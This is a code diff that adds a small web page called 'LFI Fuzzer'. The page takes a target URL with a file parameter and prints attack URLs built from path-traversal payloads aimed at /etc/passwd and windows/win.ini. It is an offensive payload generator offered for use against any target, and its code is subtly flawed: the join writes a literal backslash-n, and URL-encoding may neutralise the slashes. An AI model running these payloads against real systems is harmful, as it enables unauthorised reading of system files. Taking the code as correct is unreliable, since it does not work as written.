@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>LFI Fuzzer</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+<div class="container">
+  <h2>LFI Fuzzer</h2>
+  <input type="text" id="base" placeholder="http://target.com/page?file=" style="width:100%;">
+  <button onclick="fuzz()">Fuzz</button>
+  <pre id="output"></pre>
+</div>
+
+<script>
+function fuzz() {
+  const base = document.getElementById("base").value;
+  const payloads = ["../../../../etc/passwd", "../etc/passwd", "../../../../../../windows/win.ini"];
+  const results = payloads.map(p => base + encodeURIComponent(p)).join("\\n");
+  document.getElementById("output").textContent = results;
+}
+</script>
+</body>
+</html>
